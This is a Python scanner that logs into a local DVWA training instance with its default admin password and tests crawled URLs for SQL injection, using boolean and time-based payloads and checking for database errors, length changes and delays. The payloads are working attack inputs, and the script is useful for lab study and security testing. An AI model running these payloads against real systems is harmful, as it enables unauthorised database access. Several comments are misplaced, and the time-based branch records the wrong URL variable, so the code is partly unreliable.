
import requests
import json
import time
from bs4 import BeautifulSoup
from urllib.parse import unquote
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse#splits URL into components

TARGET_URL = "http://localhost:8080"

# -----------------------------
# Create session
# -----------------------------
session = requests.Session()

# -----------------------------
# Login to DVWA
# -----------------------------
login_page = session.get(TARGET_URL + "/login.php")
soup = BeautifulSoup(login_page.text, "html.parser")

token = soup.find("input", {"name": "user_token"})["value"]

login_data = {
    "username": "admin",
    "password": "password",
    "user_token": token,
    "Login": "Login"
}

login_response = session.post(TARGET_URL + "/login.php", data=login_data)

if "Login failed" in login_response.text:
    print("❌ Login failed!")
    exit()

print("✅ Login successful!")

# -----------------------------
# Load Crawled Links
# -----------------------------
with open("scan_results.json", "r") as f:
    data = json.load(f)

all_links = data["links"]

# -----------------------------
# SQL Injection Payloads
# -----------------------------
sql_payloads = [
    "' OR '1'='1",
    "' AND 1=2--",
    "' OR 1=1#"
]

time_payload = "' AND SLEEP(5)--"#Time-based SQLi payload,Forces database to delay response.

sql_errors = [#Known database error signatures.
    "SQL syntax",
    "mysql_fetch",
    "ORA-01756",
    "SQLSTATE",
    "syntax error",
    "unterminated",
    "Warning: mysql",
    "PDOException"
]

vulnerable_urls = []

print("\n🚀 Starting SQL Injection Testing...\n")

# -----------------------------
# Helper: Inject into parameters
# -----------------------------
def inject_payload(url, payload):
    parsed = urlparse(url)#Breaks URL into components.
    params = parse_qs(parsed.query)#Breaks URL into components.

    if not params:
        return None

    # inject into first parameter only
    for key in params:
        params[key] = [params[key][0] + payload]#Extracts query parameters into dictionary.
        break

    new_query = urlencode(params, doseq=True)#Rebuilds the full injected URL.
    return urlunparse(parsed._replace(query=new_query))


# -----------------------------
# Main Testing Loop
# -----------------------------
for url in all_links:
    if "?" not in url:#Rebuilds the full injected URL.
        continue

    print("🔍 Testing:", url)

    try:
        original_response = session.get(url, timeout=10)
        original_content = original_response.text
        original_len = len(original_content)
    except Exception as e:
        print("⚠️ Error accessing:", url)
        continue

    for payload in sql_payloads:
        injected_url = inject_payload(url, payload)

        if not injected_url:
            continue

        try:
            test_response = session.get(injected_url, timeout=10)#Captures normal page behavior.
            test_content = test_response.text
            test_len = len(test_content)
        except Exception:
            continue

        # -----------------------------
        # Detection logic (IMPROVED)
        # -----------------------------
        length_diff = abs(test_len - original_len) / max(original_len, 1)

        is_error = any(err.lower() in test_content.lower() for err in sql_errors)#Boolean-Based Testing
        is_length_anomaly = length_diff > 0.30

        if is_error or is_length_anomaly:
            print("⚠️ Possible SQL Injection:", unquote(injected_url))#Prints human-readable payload URL.
            decoded_url = unquote(injected_url)
            vulnerable_urls.append(decoded_url)
            break

    # -----------------------------
    # Time-based SQLi test (strong signal)
    # -----------------------------
    injected_time_url = inject_payload(url, time_payload)#decoded_url = unquote(injected_url)

    if injected_time_url:#Builds time-delay payload.
        try:
            start = time.time()
            session.get(injected_time_url, timeout=15)
            end = time.time()

            if end - start > 4:
                print("⏱️ Time-based SQL Injection detected:", injected_time_url)
                decoded_url = unquote(injected_url)
                vulnerable_urls.append(decoded_url)
        except Exception:
            pass

print("\n✅ SQL Injection Testing Finished!")

# -----------------------------
# Save Updated Results
# -----------------------------
data["vulnerable_urls"] = list(set(vulnerable_urls))

with open("scan_results.json", "w") as f:
    json.dump(data, f, indent=4)

print("📁 Results updated in scan_results.json")
